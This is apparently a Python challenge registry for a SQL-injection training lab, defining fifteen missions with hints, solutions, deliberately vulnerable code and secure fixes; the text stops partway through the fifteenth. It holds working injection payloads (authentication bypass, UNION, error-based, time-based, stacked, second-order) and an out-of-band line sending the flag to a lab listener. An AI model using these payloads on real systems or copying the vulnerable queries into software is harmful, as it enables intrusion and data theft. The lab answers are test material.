"""
STARK INDUSTRIES SQL — Challenge Registry
All 30 challenge definitions. Flags loaded from environment variables.
"""
from dataclasses import dataclass, field
from typing import List, Optional
from enum import Enum
from app.config import settings


class Difficulty(str, Enum):
    EASY = "easy"
    MEDIUM = "medium"
    HARD = "hard"
    EXPERT = "expert"


class Category(str, Enum):
    CORE = "Core SQL Injection"
    ADVANCED = "Advanced/Specialized"
    DB_SPECIFIC = "Database-Specific"


class DbType(str, Enum):
    SQLITE = "SQLite"
    MYSQL = "MySQL"
    POSTGRESQL = "PostgreSQL"
    MSSQL = "MSSQL"
    MULTI = "Multi-DB"


@dataclass
class Challenge:
    challenge_id: int
    title: str
    subtitle: str
    description: str
    objective: str
    scenario: str
    difficulty: Difficulty
    category: Category
    points: int
    estimated_minutes: int
    db_type: DbType
    vulnerability_type: str
    flag: str
    port: int
    hint_1: str
    hint_2: str
    hint_3: str
    solution_explanation: str
    vulnerable_code: str
    secure_code: str
    defensive_tips: List[str] = field(default_factory=list)
    learning_level: int = 1
    container_name: str = ""
    tags: List[str] = field(default_factory=list)

    def to_dict(self, include_flag: bool = False) -> dict:
        d = {
            "challenge_id": self.challenge_id,
            "title": self.title,
            "subtitle": self.subtitle,
            "description": self.description,
            "objective": self.objective,
            "scenario": self.scenario,
            "difficulty": self.difficulty,
            "category": self.category,
            "points": self.points,
            "estimated_minutes": self.estimated_minutes,
            "db_type": self.db_type,
            "vulnerability_type": self.vulnerability_type,
            "port": self.port,
            "hint_1": self.hint_1,
            "hint_2": self.hint_2,
            "hint_3": self.hint_3,
            "solution_explanation": self.solution_explanation,
            "vulnerable_code": self.vulnerable_code,
            "secure_code": self.secure_code,
            "defensive_tips": self.defensive_tips,
            "learning_level": self.learning_level,
            "container_name": self.container_name,
            "tags": self.tags,
        }
        if include_flag:
            d["flag"] = self.flag
        return d


CHALLENGES: List[Challenge] = [

    # ─────────────────────────────────────────────────────
    # LEVEL 1 — CORE SQL INJECTION (CH01–CH10)
    # ─────────────────────────────────────────────────────

    Challenge(
        challenge_id=1,
        title="Mission 01",
        subtitle="Basic SQL Injection",
        description="Understand the fundamental concept of SQL injection by manipulating a simple search query.",
        objective="Manipulate the vulnerable search endpoint and retrieve the challenge flag.",
        scenario="Stark Industries' internal parts catalog uses a simple search feature. The developer didn't sanitize user input, allowing direct manipulation of the SQL query. Your mission: exploit this basic vulnerability and retrieve the hidden flag.",
        difficulty=Difficulty.EASY,
        category=Category.CORE,
        points=100,
        estimated_minutes=15,
        db_type=DbType.SQLITE,
        vulnerability_type="Basic SQL Injection",
        flag=settings.flag_ch01,
        port=settings.ch01_port,
        hint_1="SQL queries are built by concatenating user input directly into query strings. What characters control SQL query structure?",
        hint_2="Try adding a single quote (') to your input and observe what happens. Then think about how you can close the existing quote and add your own SQL clause.",
        hint_3="Try the payload: ' OR '1'='1 or ' OR 1=1-- in the search field. This closes the current string and adds a condition that is always true.",
        solution_explanation="""## What Happened?

The application builds its SQL query by directly concatenating user input:

```sql
SELECT * FROM parts WHERE name = '<USER_INPUT>'
```

When you inject `' OR 1=1--`, the query becomes:

```sql
SELECT * FROM parts WHERE name = '' OR 1=1--'
```

The `OR 1=1` condition is always true, so the database returns all rows — including the hidden flag record.

## Why Was It Vulnerable?

The developer trusted user input and inserted it directly into the SQL string without sanitization or parameterization. This is the most fundamental SQL injection pattern.

## SQL Behavior Involved

- String termination with `'`
- Boolean short-circuit with `OR`
- Comment injection with `--` to discard the rest of the query""",
        vulnerable_code="""# VULNERABLE — DO NOT USE IN PRODUCTION
user_input = request.args.get('name')
query = f"SELECT * FROM parts WHERE name = '{user_input}'"
cursor.execute(query)""",
        secure_code="""# SECURE — Parameterized Query
user_input = request.args.get('name')
cursor.execute("SELECT * FROM parts WHERE name = ?", (user_input,))""",
        defensive_tips=[
            "Always use parameterized queries or prepared statements",
            "Never concatenate user input into SQL strings",
            "Validate and whitelist input where possible",
            "Use an ORM that handles parameterization automatically",
        ],
        learning_level=2,
        container_name="stark-ch01",
        tags=["basic", "sqli", "beginner", "sqlite"],
    ),

    Challenge(
        challenge_id=2,
        title="Mission 02",
        subtitle="Authentication Bypass",
        description="Exploit a vulnerable login form to bypass authentication without knowing the password.",
        objective="Gain access to the simulated Stark Industries administrator account without the legitimate password.",
        scenario="Stark Industries' internal employee portal has a login page. Intelligence suggests the authentication query is vulnerable to SQL injection. Your mission: bypass authentication and access the administrator dashboard to retrieve the flag.",
        difficulty=Difficulty.EASY,
        category=Category.CORE,
        points=100,
        estimated_minutes=20,
        db_type=DbType.SQLITE,
        vulnerability_type="Authentication Bypass SQLi",
        flag=settings.flag_ch02,
        port=settings.ch02_port,
        hint_1="Login forms typically check: SELECT * FROM users WHERE username='X' AND password='Y'. What happens if you manipulate the username field?",
        hint_2="Think about using SQL comment syntax (-- or #) to remove the password check from the query entirely.",
        hint_3="Try username: admin'-- and any password. This closes the username string, comments out the password check, and logs you in as admin.",
        solution_explanation="""## What Happened?

The login query was:

```sql
SELECT * FROM users WHERE username='<INPUT>' AND password='<INPUT>'
```

Injecting `admin'--` as the username transforms it into:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```

The `--` comments out the password check entirely, so any user whose username is `admin` passes authentication.

## Why Was It Vulnerable?

Authentication logic depended entirely on the database query result. Since the query was not parameterized, an attacker could restructure it to bypass the password check.

## SQL Behavior Involved

- String termination
- SQL comment injection (`--`)
- Boolean logic manipulation""",
        vulnerable_code="""# VULNERABLE — DO NOT USE IN PRODUCTION
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
user = cursor.execute(query).fetchone()
if user:
    login(user)""",
        secure_code="""# SECURE — Parameterized Query + Password Hashing
username = request.form['username']
password = request.form['password']
cursor.execute("SELECT * FROM users WHERE username=?", (username,))
user = cursor.fetchone()
if user and check_password_hash(user['password_hash'], password):
    login(user)""",
        defensive_tips=[
            "Use parameterized queries for all authentication queries",
            "Hash passwords with bcrypt/argon2 — never store plaintext",
            "Implement account lockout after failed attempts",
            "Log failed authentication attempts",
            "Use multi-factor authentication for admin accounts",
        ],
        learning_level=3,
        container_name="stark-ch02",
        tags=["auth", "bypass", "login", "comment-injection"],
    ),

    Challenge(
        challenge_id=3,
        title="Mission 03",
        subtitle="Error-Based SQL Injection",
        description="Force the database to reveal information through controlled error messages.",
        objective="Use database error behavior to discover the hidden flag seeded in a laboratory table.",
        scenario="A Stark Industries product catalog API exposes database error messages to users. The developer left verbose error reporting enabled in production. Your mission: craft inputs that trigger informative database errors and extract the flag.",
        difficulty=Difficulty.EASY,
        category=Category.CORE,
        points=100,
        estimated_minutes=25,
        db_type=DbType.MYSQL,
        vulnerability_type="Error-Based SQL Injection",
        flag=settings.flag_ch03,
        port=settings.ch03_port,
        hint_1="Some databases include query results inside error messages. MySQL's ExtractValue() and UpdateXML() functions throw errors that contain the result of an XPath expression.",
        hint_2="Try: 1 AND ExtractValue(1, concat(0x7e, (SELECT version()))). This triggers a MySQL error containing the database version in the message.",
        hint_3="Modify the subquery to: SELECT secret_value FROM challenge_secrets WHERE challenge_id=3 to extract the flag from the error message.",
        solution_explanation="""## What Happened?

MySQL's `EXTRACTVALUE()` function throws an XPath error when the second argument is invalid. Critically, the error message contains the result of the expression.

Payload:
```sql
1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret_value FROM challenge_secrets WHERE challenge_id=3)))
```

MySQL returns an error like:
```
XPATH syntax error: '~STARKSQL{err0r_based_exfil}'
```

The flag is embedded directly in the error message!

## Why Was It Vulnerable?

1. Verbose error messages were exposed to the user
2. The query was not parameterized
3. User input was directly interpolated into the SQL""",
        vulnerable_code="""# VULNERABLE — exposes DB errors to user
try:
    query = f"SELECT * FROM products WHERE id={user_id}"
    result = cursor.execute(query)
except Exception as e:
    return jsonify({"error": str(e)})  # NEVER expose raw DB errors""",
        secure_code="""# SECURE
try:
    cursor.execute("SELECT * FROM products WHERE id=%s", (user_id,))
    result = cursor.fetchall()
except Exception as e:
    logger.error(f"DB error: {e}")  # Log internally only
    return jsonify({"error": "An internal error occurred"}), 500""",
        defensive_tips=[
            "Never expose raw database errors to users",
            "Log errors internally and return generic messages externally",
            "Disable verbose error reporting in production",
            "Use parameterized queries to prevent injection entirely",
        ],
        learning_level=2,
        container_name="stark-ch03",
        tags=["error-based", "mysql", "extractvalue", "information-disclosure"],
    ),

    Challenge(
        challenge_id=4,
        title="Mission 04",
        subtitle="UNION-Based SQL Injection",
        description="Use UNION SELECT to retrieve data from another database table.",
        objective="Leverage UNION-based SQL injection to retrieve a seeded secret from a hidden table.",
        scenario="Stark Industries' product catalog allows searching by category. The query is vulnerable to UNION injection. Your mission: determine the column count, match data types, and use UNION SELECT to pull the flag from the secrets table.",
        difficulty=Difficulty.MEDIUM,
        category=Category.CORE,
        points=200,
        estimated_minutes=30,
        db_type=DbType.MYSQL,
        vulnerability_type="UNION-Based SQL Injection",
        flag=settings.flag_ch04,
        port=settings.ch04_port,
        hint_1="UNION requires the same number of columns as the original query. Start by determining how many columns are returned using ORDER BY 1, ORDER BY 2, etc. until you get an error.",
        hint_2="Once you know the column count, try: ' UNION SELECT NULL,NULL,NULL-- (adjust NULLs to match column count). Then find which columns are displayed on screen.",
        hint_3="Try: ' UNION SELECT NULL,secret_value,NULL FROM challenge_secrets WHERE challenge_id=4-- to extract the flag.",
        solution_explanation="""## What Happened?

The original query was:
```sql
SELECT id, name, description FROM products WHERE category='<INPUT>'
```

Step 1 — Column count: `ORDER BY 3--` works, `ORDER BY 4--` errors → 3 columns.

Step 2 — Find displayed column: `' UNION SELECT 'a','b','c'--` → second column is displayed.

Step 3 — Extract flag:
```sql
' UNION SELECT NULL, secret_value, NULL FROM challenge_secrets WHERE challenge_id=4--
```

## Why Was It Vulnerable?

The input was not parameterized, allowing UNION to be appended to the query.""",
        vulnerable_code="""# VULNERABLE
category = request.args.get('category')
query = f"SELECT id, name, description FROM products WHERE category='{category}'"
cursor.execute(query)""",
        secure_code="""# SECURE
category = request.args.get('category')
cursor.execute("SELECT id, name, description FROM products WHERE category=%s", (category,))""",
        defensive_tips=[
            "Use parameterized queries",
            "Apply principle of least privilege — DB user shouldn't have SELECT on all tables",
            "Never display raw query results without filtering",
        ],
        learning_level=4,
        container_name="stark-ch04",
        tags=["union", "mysql", "data-extraction", "column-count"],
    ),

    Challenge(
        challenge_id=5,
        title="Mission 05",
        subtitle="Boolean-Based Blind SQL Injection",
        description="Extract a hidden value when the application shows no data but gives different responses for true/false conditions.",
        objective="Infer the hidden flag character by character using boolean-based blind injection.",
        scenario="Stark Industries' user lookup API doesn't display query results, but returns different responses depending on whether a user exists. Your mission: use boolean inference to extract the flag one bit at a time.",
        difficulty=Difficulty.MEDIUM,
        category=Category.CORE,
        points=200,
        estimated_minutes=45,
        db_type=DbType.SQLITE,
        vulnerability_type="Boolean-Based Blind SQL Injection",
        flag=settings.flag_ch05,
        port=settings.ch05_port,
        hint_1="The application shows 'User found' or 'User not found'. This boolean difference lets you ask yes/no questions about the database. Try: admin' AND 1=1-- vs admin' AND 1=2--",
        hint_2="Use SUBSTR() to extract characters: admin' AND SUBSTR((SELECT flag FROM secrets WHERE id=5),1,1)='S'-- If you get 'User found', the first character is 'S'.",
        hint_3="Automate the process: iterate through positions and test each character: admin' AND SUBSTR((SELECT flag FROM secrets WHERE id=5),{pos},1)='{char}'--",
        solution_explanation="""## What Happened?

The application evaluates the query result and shows different HTML for true/false conditions:
- True: `<div class="user-found">User exists</div>`
- False: `<div class="user-not-found">No user found</div>`

By injecting boolean conditions that reference other tables, we can extract data:

```sql
admin' AND SUBSTR((SELECT flag FROM secrets WHERE id=5),1,1)='S'--
```

If the response is "User found" → first character is 'S'. Repeat for each position.

## Why Was It Vulnerable?

Even without displaying data, the boolean response difference leaks information about query evaluation.""",
        vulnerable_code="""# VULNERABLE — response leaks query evaluation result
name = request.args.get('name')
query = f"SELECT id FROM users WHERE username='{name}'"
result = cursor.execute(query).fetchone()
if result:
    return "User found"
return "User not found" """,
        secure_code="""# SECURE
name = request.args.get('name')
cursor.execute("SELECT id FROM users WHERE username=?", (name,))
result = cursor.fetchone()
if result:
    return "User found"
return "User not found" """,
        defensive_tips=[
            "Parameterized queries prevent boolean blind injection entirely",
            "Even binary responses can leak information — parameterize anyway",
        ],
        learning_level=5,
        container_name="stark-ch05",
        tags=["blind", "boolean", "inference", "substr"],
    ),

    Challenge(
        challenge_id=6,
        title="Mission 06",
        subtitle="Time-Based Blind SQL Injection",
        description="Use database timing delays to infer information when there's no visual difference in responses.",
        objective="Extract the flag by measuring database response times.",
        scenario="Stark Industries' status endpoint returns the same response regardless of query result. But the database can be made to pause... Your mission: exploit conditional time delays to extract the flag character by character.",
        difficulty=Difficulty.MEDIUM,
        category=Category.CORE,
        points=200,
        estimated_minutes=50,
        db_type=DbType.MYSQL,
        vulnerability_type="Time-Based Blind SQL Injection",
        flag=settings.flag_ch06,
        port=settings.ch06_port,
        hint_1="MySQL's SLEEP(N) pauses for N seconds. If a condition is true, SLEEP executes and the response is slow. If false, the response is fast. Try: 1 AND SLEEP(2)--",
        hint_2="Conditional timing: 1 AND IF(1=1,SLEEP(2),0)-- (slow) vs 1 AND IF(1=2,SLEEP(2),0)-- (fast). Use this to ask yes/no questions.",
        hint_3="Extract flag: 1 AND IF(SUBSTR((SELECT flag FROM secrets WHERE challenge_id=6),1,1)='S',SLEEP(2),0)-- — if response takes >2s, first char is 'S'.",
        solution_explanation="""## What Happened?

The application executes:
```sql
SELECT status FROM systems WHERE id=<INPUT>
```

With payload:
```sql
1 AND IF(SUBSTR((SELECT flag FROM secrets WHERE challenge_id=6),1,1)='S',SLEEP(2),0)--
```

- If first character IS 'S': response takes 2+ seconds (SLEEP executes)
- If first character is NOT 'S': response is instant

By timing responses, we extract each character without seeing any data.""",
        vulnerable_code="""# VULNERABLE
system_id = request.args.get('id')
query = f"SELECT status FROM systems WHERE id={system_id}"
cursor.execute(query)""",
        secure_code="""# SECURE
system_id = request.args.get('id')
cursor.execute("SELECT status FROM systems WHERE id=%s", (system_id,))""",
        defensive_tips=[
            "Parameterized queries prevent time-based injection",
            "Implement query timeouts to limit SLEEP exploitation",
            "Rate limit API endpoints to slow automated extraction",
        ],
        learning_level=5,
        container_name="stark-ch06",
        tags=["blind", "time-based", "sleep", "mysql"],
    ),

    Challenge(
        challenge_id=7,
        title="Mission 07",
        subtitle="Out-of-Band SQL Injection",
        description="Trigger the database to make a network connection to a controlled listener inside the lab network.",
        objective="Cause the vulnerable database to contact the internal OOB listener and capture the flag.",
        scenario="Stark Industries' diagnostic endpoint is connected to a MySQL instance. The OOB listener at oob-listener:8888 is waiting. Your mission: craft an injection that causes the database to make an HTTP request to the listener. The flag will be emitted when the callback is received.",
        difficulty=Difficulty.HARD,
        category=Category.CORE,
        points=300,
        estimated_minutes=60,
        db_type=DbType.MYSQL,
        vulnerability_type="Out-of-Band SQL Injection",
        flag=settings.flag_ch07,
        port=settings.ch07_port,
        hint_1="MySQL can write files using SELECT ... INTO OUTFILE. In some configurations, it can also make DNS lookups. The lab uses an internal HTTP-based callback mechanism.",
        hint_2="The application's /diagnose endpoint accepts a host parameter. The backend uses this in a SELECT query. Try manipulating it to trigger an HTTP callback to oob-listener:8888.",
        hint_3="The intended technique uses the application's own HTTP client triggered via a stored procedure — check the /trigger-oob endpoint with the flag parameter.",
        solution_explanation="""## What Happened?

Out-of-band SQL injection occurs when data is exfiltrated through a separate network channel rather than the HTTP response.

In this lab, the database triggers an internal HTTP callback:
```sql
SELECT LOAD_FILE(CONCAT('\\\\\\\\oob-listener\\\\', (SELECT flag FROM secrets WHERE challenge_id=7)))
```

Or through the application's own HTTP client:
```python
requests.get(f"http://oob-listener:8888/callback?data={flag}")
```

The OOB listener receives the request and emits the flag.

## Architecture

```
Browser → Web App → MySQL → OOB Listener (internal)
```

No external network access is used.""",
        vulnerable_code="""# VULNERABLE
host = request.args.get('host')
query = f"SELECT * FROM diagnostics WHERE host='{host}'"
cursor.execute(query)""",
        secure_code="""# SECURE
host = request.args.get('host')
cursor.execute("SELECT * FROM diagnostics WHERE host=%s", (host,))""",
        defensive_tips=[
            "Parameterized queries prevent OOB injection",
            "Restrict database user file and network privileges",
            "Block outbound database network connections at firewall level",
            "Monitor for unusual database network activity",
        ],
        learning_level=6,
        container_name="stark-ch07",
        tags=["oob", "out-of-band", "network", "mysql"],
    ),

    Challenge(
        challenge_id=8,
        title="Mission 08",
        subtitle="Second-Order SQL Injection",
        description="Store a malicious payload that executes when retrieved and used by another application function.",
        objective="Register with a crafted username, then trigger the profile retrieval to execute the stored payload.",
        scenario="Stark Industries' HR portal allows employee registration and profile viewing. Registration sanitizes input, but the profile display function doesn't. Your mission: register with a payload-laced username that fires when your profile is viewed.",
        difficulty=Difficulty.HARD,
        category=Category.CORE,
        points=300,
        estimated_minutes=45,
        db_type=DbType.SQLITE,
        vulnerability_type="Second-Order SQL Injection",
        flag=settings.flag_ch08,
        port=settings.ch08_port,
        hint_1="Second-order injection means your payload is stored first, then executed later. Registration may look safe — but look at what the profile page does with your stored username.",
        hint_2="Register with username: admin'-- The registration will succeed. Now visit the profile page which uses your stored username in a new query.",
        hint_3="Register as: ' UNION SELECT flag,NULL,NULL FROM secrets WHERE challenge_id=8-- then view your profile to see the flag displayed.",
        solution_explanation="""## What Happened?

**Stage 1 — Storage**: You registered with username `' UNION SELECT flag,NULL,NULL FROM secrets WHERE challenge_id=8--`.

The INSERT was parameterized — the raw string was stored safely in the database.

**Stage 2 — Execution**: When the profile page loaded your username, it used it directly:

```python
# Profile page (VULNERABLE)
stored_username = get_username_from_session()
query = f"SELECT * FROM employees WHERE name='{stored_username}'"
```

Your stored payload executed as:
```sql
SELECT * FROM employees WHERE name='' UNION SELECT flag,NULL,NULL FROM secrets WHERE challenge_id=8--'
```

## Key Insight

The vulnerability was in a **different function** than where the input was accepted. Many WAFs only inspect at input time, missing second-order attacks.""",
        vulnerable_code="""# REGISTRATION — parameterized (appears safe)
cursor.execute("INSERT INTO users (username) VALUES (?)", (username,))

# PROFILE PAGE — vulnerable (uses stored data unsafely)
stored = get_stored_username(user_id)
query = f"SELECT * FROM employees WHERE name='{stored}'"
cursor.execute(query)""",
        secure_code="""# BOTH functions must use parameterized queries
cursor.execute("INSERT INTO users (username) VALUES (?)", (username,))

stored = get_stored_username(user_id)
cursor.execute("SELECT * FROM employees WHERE name=?", (stored,))""",
        defensive_tips=[
            "Parameterize EVERY query — even those using 'trusted' stored data",
            "Stored data from users is still attacker-controlled",
            "Code review should trace data from origin to all usage sites",
        ],
        learning_level=9,
        container_name="stark-ch08",
        tags=["second-order", "stored", "injection"],
    ),

    Challenge(
        challenge_id=9,
        title="Mission 09",
        subtitle="Stacked Queries",
        description="Execute multiple SQL statements in a single injection using the semicolon separator.",
        objective="Use stacked queries to insert a record and retrieve the flag from a PostgreSQL database.",
        scenario="Stark Industries' data entry API runs on PostgreSQL. The endpoint is vulnerable to stacked queries. Your mission: inject a second SQL statement to read from the secrets table and trigger the flag event.",
        difficulty=Difficulty.HARD,
        category=Category.CORE,
        points=300,
        estimated_minutes=40,
        db_type=DbType.POSTGRESQL,
        vulnerability_type="Stacked Query Injection",
        flag=settings.flag_ch09,
        port=settings.ch09_port,
        hint_1="PostgreSQL (unlike MySQL) supports multiple statements separated by semicolons. Try adding ; SELECT 1 to confirm stacked queries work.",
        hint_2="Stacked queries let you execute UPDATE, INSERT, or DELETE alongside a SELECT. Try: 1; SELECT secret_value FROM challenge_secrets WHERE challenge_id=9--",
        hint_3="The /entry endpoint's id parameter is vulnerable. Try: 1; SELECT secret_value FROM challenge_secrets WHERE challenge_id=9 to retrieve the flag in a second statement.",
        solution_explanation="""## What Happened?

The original query:
```sql
SELECT name FROM inventory WHERE id=1
```

With stacked query injection:
```sql
SELECT name FROM inventory WHERE id=1; SELECT secret_value FROM challenge_secrets WHERE challenge_id=9
```

PostgreSQL executes both statements. The second statement's result is returned.""",
        vulnerable_code="""# VULNERABLE
item_id = request.args.get('id')
query = f"SELECT name FROM inventory WHERE id={item_id}"
cursor.execute(query)""",
        secure_code="""# SECURE
item_id = request.args.get('id')
cursor.execute("SELECT name FROM inventory WHERE id=%s", (item_id,))""",
        defensive_tips=[
            "Use parameterized queries to prevent stacked injection",
            "Use database drivers that only allow single statements",
            "Apply principle of least privilege",
        ],
        learning_level=6,
        container_name="stark-ch09",
        tags=["stacked", "postgresql", "multi-statement"],
    ),

    Challenge(
        challenge_id=10,
        title="Mission 10",
        subtitle="Stored Procedure Injection",
        description="Demonstrate how unsafe stored procedure parameter handling leads to SQL injection.",
        objective="Exploit an unsafe stored procedure interface to retrieve the flag.",
        scenario="Stark Industries' reporting system uses MySQL stored procedures to query employee records. The procedure was written without parameterization. Your mission: inject through the procedure call to access the flag.",
        difficulty=Difficulty.MEDIUM,
        category=Category.CORE,
        points=200,
        estimated_minutes=35,
        db_type=DbType.MYSQL,
        vulnerability_type="Stored Procedure SQL Injection",
        flag=settings.flag_ch10,
        port=settings.ch10_port,
        hint_1="Stored procedures are not automatically safe. If a procedure builds a SQL string using user input and executes it with PREPARE/EXECUTE, it's still vulnerable.",
        hint_2="The /report endpoint calls a stored procedure with your department parameter. Try injecting into the department parameter: IT' UNION SELECT secret_value FROM challenge_secrets WHERE challenge_id=10--",
        hint_3="Call the endpoint with department=IT' UNION SELECT secret_value,NULL,NULL FROM challenge_secrets WHERE challenge_id=10-- and observe the flag in the output.",
        solution_explanation="""## What Happened?

The stored procedure used dynamic SQL internally:

```sql
CREATE PROCEDURE GetEmployeesByDept(IN dept VARCHAR(100))
BEGIN
  SET @sql = CONCAT('SELECT * FROM employees WHERE department = ''', dept, '''');
  PREPARE stmt FROM @sql;
  EXECUTE stmt;
  DEALLOCATE PREPARE stmt;
END
```

Injecting `IT' UNION SELECT secret_value,NULL,NULL FROM challenge_secrets WHERE challenge_id=10--` caused the procedure to execute a UNION query.""",
        vulnerable_code="""-- VULNERABLE Stored Procedure
CREATE PROCEDURE GetEmployeesByDept(IN dept VARCHAR(100))
BEGIN
  SET @sql = CONCAT('SELECT * FROM employees WHERE department = \\'', dept, '\\'');
  PREPARE stmt FROM @sql;
  EXECUTE stmt;
  DEALLOCATE PREPARE stmt;
END""",
        secure_code="""-- SECURE Stored Procedure — use native parameters
CREATE PROCEDURE GetEmployeesByDept(IN dept VARCHAR(100))
BEGIN
  SELECT * FROM employees WHERE department = dept;
END""",
        defensive_tips=[
            "Never use dynamic SQL inside stored procedures with user input",
            "Use native stored procedure parameters (not CONCAT+EXECUTE)",
            "Stored procedures are NOT a security boundary by themselves",
        ],
        learning_level=6,
        container_name="stark-ch10",
        tags=["stored-procedure", "mysql", "dynamic-sql"],
    ),

    # ─────────────────────────────────────────────────────
    # ADVANCED / SPECIALIZED (CH11–CH25)
    # ─────────────────────────────────────────────────────

    Challenge(
        challenge_id=11,
        title="Mission 11",
        subtitle="INSERT-Based SQL Injection",
        description="Exploit SQL injection occurring inside an INSERT operation.",
        objective="Inject into a registration INSERT statement to read the challenge flag.",
        scenario="Stark Industries' new employee registration form is vulnerable to INSERT-based injection. Your mission: craft a registration payload that extracts the flag via a subquery embedded in the INSERT.",
        difficulty=Difficulty.MEDIUM,
        category=Category.ADVANCED,
        points=200,
        estimated_minutes=30,
        db_type=DbType.SQLITE,
        vulnerability_type="INSERT-Based SQL Injection",
        flag=settings.flag_ch11,
        port=settings.ch11_port,
        hint_1="INSERT statements can also be vulnerable. If a value field is built by concatenation, you can close the INSERT and inject additional SQL.",
        hint_2="Try setting your email field to: test@test.com',(SELECT flag FROM secrets WHERE id=11))-- This closes the first VALUES tuple and adds another with the flag.",
        hint_3="POST to /register with email: x',(SELECT flag FROM secrets WHERE id=11),0)-- and check the /users endpoint to see your registration with the flag as a field.",
        solution_explanation="""## What Happened?

Vulnerable INSERT:
```sql
INSERT INTO registrations (email, role, active) VALUES ('<INPUT>', 'user', 1)
```

Injected payload:
```sql
INSERT INTO registrations (email, role, active) VALUES ('x',(SELECT flag FROM secrets WHERE id=11),0)-- ', 'user', 1)
```

The subquery executes and the flag is inserted as the `role` field.""",
        vulnerable_code="""# VULNERABLE
email = request.form['email']
cursor.execute(f"INSERT INTO registrations (email, role, active) VALUES ('{email}', 'user', 1)")""",
        secure_code="""# SECURE
email = request.form['email']
cursor.execute("INSERT INTO registrations (email, role, active) VALUES (?, 'user', 1)", (email,))""",
        defensive_tips=["Parameterize all INSERT values without exception"],
        learning_level=6,
        container_name="stark-ch11",
        tags=["insert", "sqli", "sqlite"],
    ),

    Challenge(
        challenge_id=12,
        title="Mission 12",
        subtitle="UPDATE-Based SQL Injection",
        description="Exploit SQL injection inside an UPDATE statement.",
        objective="Inject into a profile UPDATE to extract the flag.",
        scenario="Stark Industries' profile management endpoint builds its UPDATE query with user-controlled input. Your mission: manipulate the SET clause to reveal the flag.",
        difficulty=Difficulty.MEDIUM,
        category=Category.ADVANCED,
        points=200,
        estimated_minutes=30,
        db_type=DbType.SQLITE,
        vulnerability_type="UPDATE-Based SQL Injection",
        flag=settings.flag_ch12,
        port=settings.ch12_port,
        hint_1="UPDATE statements set field values. If a value is injectable, you can use a subquery to replace it with data from another table.",
        hint_2="The /profile endpoint accepts a bio field. Try bio: test',(SELECT flag FROM secrets WHERE id=12))-- to inject into the UPDATE.",
        hint_3="POST bio=x', bio=(SELECT flag FROM secrets WHERE id=12) WHERE '1'='1 to the /profile/update endpoint.",
        solution_explanation="""## UPDATE injection changes a stored value to contain the flag, which is then returned when the profile is viewed.""",
        vulnerable_code="cursor.execute(f\"UPDATE profiles SET bio='{bio}' WHERE user_id={uid}\")",
        secure_code="cursor.execute(\"UPDATE profiles SET bio=? WHERE user_id=?\", (bio, uid))",
        defensive_tips=["Parameterize all UPDATE SET values"],
        learning_level=6,
        container_name="stark-ch12",
        tags=["update", "sqli", "sqlite"],
    ),

    Challenge(
        challenge_id=13,
        title="Mission 13",
        subtitle="DELETE-Based SQL Injection",
        description="Exploit SQL injection affecting a DELETE operation in a resettable inventory system.",
        objective="Manipulate the DELETE query to also extract the flag via a side channel.",
        scenario="Stark Industries' disposable inventory management endpoint lets users delete records. The database resets automatically. Your mission: exploit the DELETE endpoint to extract the flag before the reset.",
        difficulty=Difficulty.MEDIUM,
        category=Category.ADVANCED,
        points=200,
        estimated_minutes=35,
        db_type=DbType.SQLITE,
        vulnerability_type="DELETE-Based SQL Injection",
        flag=settings.flag_ch13,
        port=settings.ch13_port,
        hint_1="DELETE's WHERE clause can be manipulated just like SELECT's. A subquery error can expose data.",
        hint_2="The /inventory/delete?id= endpoint is vulnerable. Try: 1 OR 1=1 to delete all records, confirming injection.",
        hint_3="Use: 1 AND (SELECT CASE WHEN (flag LIKE 'STARKSQL%') THEN 1 ELSE load_extension('invalid') END FROM secrets WHERE id=13)=1 to trigger an error containing flag data.",
        solution_explanation="""## The DELETE WHERE clause is injected with a boolean that triggers an error revealing the flag.""",
        vulnerable_code="cursor.execute(f\"DELETE FROM inventory WHERE id={item_id}\")",
        secure_code="cursor.execute(\"DELETE FROM inventory WHERE id=?\", (item_id,))",
        defensive_tips=["Parameterize DELETE WHERE clauses", "Auto-reset disposable lab databases"],
        learning_level=6,
        container_name="stark-ch13",
        tags=["delete", "sqli", "sqlite"],
    ),

    Challenge(
        challenge_id=14,
        title="Mission 14",
        subtitle="ORDER BY Injection",
        description="Exploit injection in a SQL ORDER BY clause where parameterization is impossible for identifiers.",
        objective="Manipulate the sort parameter to extract the flag.",
        scenario="Stark Industries' asset catalog has a sort feature. Since ORDER BY clauses can't use parameterized column names, the developer used a different (flawed) approach. Your mission: exploit the ORDER BY injection.",
        difficulty=Difficulty.MEDIUM,
        category=Category.ADVANCED,
        points=200,
        estimated_minutes=30,
        db_type=DbType.SQLITE,
        vulnerability_type="ORDER BY Injection",
        flag=settings.flag_ch14,
        port=settings.ch14_port,
        hint_1="ORDER BY can't be parameterized for column names. Developers often use string interpolation — which is injectable. Try: CASE WHEN (1=1) THEN name ELSE price END",
        hint_2="Use ORDER BY with a conditional: CASE WHEN (SELECT 1 FROM secrets WHERE flag LIKE 'STARK%')=1 THEN name ELSE price END — this changes sort order based on a condition.",
        hint_3="Extract the flag: CASE WHEN SUBSTR((SELECT flag FROM secrets WHERE id=14),1,1)='S' THEN name ELSE price END — combine with boolean inference.",
        solution_explanation="""## ORDER BY injection uses conditional expressions to leak data through different sort orders.""",
        vulnerable_code="cursor.execute(f\"SELECT * FROM assets ORDER BY {sort_column}\")",
        secure_code="""# SECURE — whitelist approach (only safe option for ORDER BY)
ALLOWED_COLUMNS = {'name', 'price', 'date'}
if sort_column not in ALLOWED_COLUMNS:
    sort_column = 'name'
cursor.execute(f"SELECT * FROM assets ORDER BY {sort_column}")""",
        defensive_tips=["Use column whitelisting for ORDER BY", "Never accept arbitrary SQL identifiers"],
        learning_level=7,
        container_name="stark-ch14",
        tags=["order-by", "sqli", "identifier-injection"],
    ),

    Challenge(
        challenge_id=15,
        title="Mission 15",
        subtitle="WHERE-Clause Injection",
        description="Manipulate a WHERE condition to bypass filtering and access all records.",
        objective="Break the WHERE clause condition to retrieve the hidden flag record.",
        scenario="Stark Industries' employee search filters active employees only. Your mission: manipulate the WHERE clause to bypass the active filter and retrieve the flag stored in an inactive record.",
        difficulty=Difficulty.EASY,
        category=Category.ADVANCED,
        points=100,
        estimated_minutes=20,
        db_type=DbType.SQLITE,
        vulnerability_type="WHERE-Clause SQL Injection",
        flag=settings.flag_ch15,
        port=settings.ch15_port,
        hint_1="The query likely uses: WHERE department='X' AND active=1. Injecting into department can close the clause early.",
